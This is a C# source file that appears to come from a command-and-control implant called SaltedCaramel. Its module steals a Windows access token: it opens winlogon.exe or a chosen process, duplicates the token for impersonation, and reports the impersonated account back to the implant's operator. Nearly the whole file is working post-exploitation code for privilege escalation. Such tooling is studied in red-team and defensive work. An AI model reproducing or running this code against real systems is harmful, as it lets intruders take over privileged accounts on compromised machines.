using Microsoft.Win32.SafeHandles;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SaltedCaramel
{
    class Token
    {
        internal static IntPtr stolenHandle;


        public static void StealToken(SCTask task, SCImplant implant)
        {
            int procId = 0;
            SafeWaitHandle procHandle;
            if (task.@params == "")
            {
                Process winlogon = Process.GetProcessesByName("winlogon")[0];
                procHandle = new SafeWaitHandle(winlogon.Handle, true);
                Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
            }
            else
            {
                procId = Convert.ToInt32(task.@params);
                procHandle = new SafeWaitHandle(Process.GetProcessById(procId).Handle, true);
                Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
            }
            IntPtr tokenHandle = IntPtr.Zero; // Stores the handle for the original process token
            stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token

            try
            {
                try
                {
                    // Get handle to target process token
                    bool procToken = Win32.OpenProcessToken(procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, out tokenHandle);

                    if (!procToken) // Check if OpenProcessToken was successful
                        throw new Exception(Marshal.GetLastWin32Error().ToString());

                    Debug.WriteLine("[+] StealToken - OpenProcessToken: " + procToken);

                    try
                    {
                        // Duplicate token as stolenHandle
                        bool duplicateToken = Win32.DuplicateTokenEx(tokenHandle, (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation,
                            Win32.TOKEN_TYPE.TokenImpersonation, out stolenHandle);

                        if (!duplicateToken) // Check if DuplicateTokenEx was successful
                            throw new Exception(Marshal.GetLastWin32Error().ToString());

                        Debug.WriteLine("[+] StealToken - DuplicateTokenEx: " + duplicateToken);

                        WindowsIdentity ident = new WindowsIdentity(stolenHandle);
                        Debug.WriteLine("[+] StealToken - Successfully impersonated " + ident.Name);
                        implant.PostResponse(new SCTaskResp(task.id, "Successfully impersonated " + ident.Name));
                        ident.Dispose();
                        Win32.CloseHandle(tokenHandle);
                        procHandle.Close();
                        implant.SendComplete(task.id);
                    }
                    catch (Exception e) // Catch errors thrown by DuplicateTokenEx
                    {
                        Debug.WriteLine("[!] StealToken - ERROR duplicating token: " + e.Message);
                        implant.SendError(task.id, e.Message);
                    }
                }
                catch (Exception e) // Catch errors thrown by OpenProcessToken
                {
                    Debug.WriteLine("[!] StealToken - ERROR creating token handle: " + e.Message);
                    implant.SendError(task.id, e.Message);
                }
            }
            catch (Exception e) // Catch errors thrown by Process.GetProcessById
            {
                Debug.WriteLine("[!] StealToken - ERROR creating process handle: " + e.Message);
                implant.SendError(task.id, e.Message);
            }

        }

        internal static void Revert(SCTask task, SCImplant implant)
        {
            Win32.CloseHandle(stolenHandle);
            stolenHandle = IntPtr.Zero;
            implant.SendComplete(task.id);
        }
    }
}